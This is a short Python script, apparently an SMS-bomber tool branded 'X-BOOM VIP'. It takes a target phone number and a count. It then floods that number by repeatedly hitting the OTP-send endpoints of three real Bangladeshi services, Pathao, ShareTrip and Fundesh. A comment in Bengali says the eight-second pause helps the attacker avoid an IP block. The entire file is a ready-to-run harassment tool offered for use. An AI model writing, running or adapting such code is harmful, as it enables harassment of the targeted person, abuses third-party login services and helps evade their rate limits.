import requests
import os
import time

def banner():
    os.system('clear')
    print("========================================")
    print("        X-BOOM VIP (MR-ZIHAD STYLE)     ")
    print("     POWERED BY: mmalekislam788         ")
    print("========================================")

def send_sms(target, count):
    # বর্তমানে সচল ৩টি পাওয়ারফুল API (যা অন্যরা ব্যবহার করে)
    url1 = "https://api-hermes.pathao.com/user/otp-send/login"
    url2 = "https://api.sharetrip.net/api/v1/otp/send"
    url3 = "https://api.fundesh.com.bd/api/auth/send-otp"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6)",
        "Content-Type": "application/json"
    }

    print(f"\n[+] Global Attack started on: {target}")
    for i in range(count):
        try:
            # Slot 1: Pathao
            requests.post(url1, json={"phone": "+88"+target}, headers=headers)
            # Slot 2: ShareTrip
            requests.post(url2, json={"mobileNumber": target, "type": "login"}, headers=headers)
            # Slot 3: Fundesh
            requests.post(url3, json={"phoneNumber": target, "service": "LOGIN"}, headers=headers)
            
            print(f"[!] SMS Slot {i+1} - Success!")
        except:
            print(f"[-] SMS Slot {i+1} - Failed")
        
        # ৮ সেকেন্ড গ্যাপ দিলে আপনার IP ব্লক হবে না
        time.sleep(8)

def main():
    banner()
    number = input("Target Number (01xxxxxxxxx): ")
    amount = int(input("Amount: "))
    send_sms(number, amount)

if __name__ == "__main__":
    main()
  


